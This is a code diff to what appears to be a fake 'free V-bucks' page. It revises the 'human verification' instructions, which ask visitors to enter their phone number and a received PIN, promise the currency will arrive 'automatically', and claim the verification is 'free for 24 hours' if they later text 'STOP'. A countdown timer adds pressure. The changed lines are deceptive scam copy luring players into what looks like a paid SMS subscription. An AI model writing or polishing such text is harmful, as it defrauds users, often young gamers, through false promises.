@@ -46,9 +46,11 @@ define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_
     <br>
     <p>2. Enter your phone number and enter the received PIN.</p>
     <br>
-    <p>3. Wait up to 30 minutes until you recieve your v-bucks then text "STOP" to 64055.</p>
+    <p>3. Your V-bucks will be added automatically.</p>
     <br>
-    <p>IMPORTANT: THE VERIFICATION IS 100% FREE IF YOU TEXT "STOP" TO THIS NUMBER 64055. DO NOT TEXT "STOP" UNTIL YOU RECEIVE YOUR V-BUCKS.</p>
+    <p>4. Reply with the text "STOP" to the number you recieved your PIN.</p>
+    <br>
+    <p>IMPORTANT: THE VERIFICATION IS 100% FREE FOR 24 HOURS. MAKE SURE TO REPLY WITH THE TEXT "STOP".</p>
      <br>
 	<div class="verification-loader-wrapper">
 		<div class="spinner">
@@ -63,5 +65,4 @@ define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_
 		<span>Time Left:</span>
 		<span id="human_verification_timer_time"></span>
 	</div>
-
 </div>
